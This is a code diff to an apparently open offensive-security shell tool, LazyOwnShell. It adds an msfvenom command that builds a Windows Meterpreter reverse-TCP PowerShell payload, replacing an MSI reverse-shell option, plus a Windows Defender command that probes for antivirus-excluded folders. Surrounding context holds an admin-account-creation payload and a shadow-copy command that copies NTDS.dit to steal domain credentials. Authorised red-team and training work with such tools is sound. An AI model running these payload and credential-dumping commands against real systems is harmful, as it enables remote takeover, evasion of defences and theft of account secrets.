@@ -1802,7 +1802,8 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg("18: windows/x64/exec cmd='net user administrator P@s5w0rd123!'")
         print_msg("19: windows/shell_reverse_tcp python shellcode")
         print_msg("20: windows/x64/shell_reverse_tcp msi")
-        choice = input("Enter your choice (1-20): ").strip()
+        print_msg("21: windows/meterpreter/reverse_tcp Powershell")
+        choice = input("Enter your choice (1-21): ").strip()
 
         # Define payload commands
         commands = {
@@ -1836,11 +1837,10 @@ class LazyOwnShell(cmd2.Cmd):
             "19": (
                 f'msfvenom -p windows/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" EXITFUNC=thread -b "\\x00\\x0d\\x0a" -f python > sessions/run.py'
             ),
-            "20": (
-                f'msfvenom -p windows/x64/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" -f msi > sessions/shell64.msi'
+            "21": (
+                f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT="{lport}" -f psh > sessions/Shell.ps1'
             )
         }
-
         if choice in commands:
             if choice == '14':
                 os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > sessions/shell.exe')
@@ -3939,8 +3939,8 @@ class LazyOwnShell(cmd2.Cmd):
         url = self.params["url"]
 
         if line:
+            parts = line.split(" ")
             if line.startswith("req"):
-                parts = line.split(" ")
                 print_msg("Nùmero de parametros: " + str(len(parts)))
                 if len(parts) == 1:
                     arg1 = parts[0]
@@ -5422,6 +5422,7 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN User accounts", "net user"),
             ("WIN Show computers", "net view"),
             ("WIN ARP Table", "arp -a"),
+            ("WIN Enum AV folder protected","& \"C:\Program Files\Windows Defender\MpCmdRun.exe\" -Scan -ScanType 3 -File \"C:\\folder_to_check\|*\""),
             ("WIN Force Install", "Set __COMPAT_LAYER=RunAsInvoker ; Start Shell64.exe"),
             ("WIN IP Configuration", "ipconfig /all"),
             ("WIN Crear Instantánea:C", 'vssadmin CREATE SHADOW /For=C: \r\n cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit c:\\NTDS.dit'),
@@ -18318,6 +18319,7 @@ class LazyOwnShell(cmd2.Cmd):
         if line:
             url = line.strip()
         try:
+            input("    [*] Port 80 needs to be free. Terminate the process listening on port 80. Press Enter to continue.: ")
             print_msg("Starting HTTP server on port 80")
             activate_server(httpd, url, lhost)
             httpd.serve_forever()
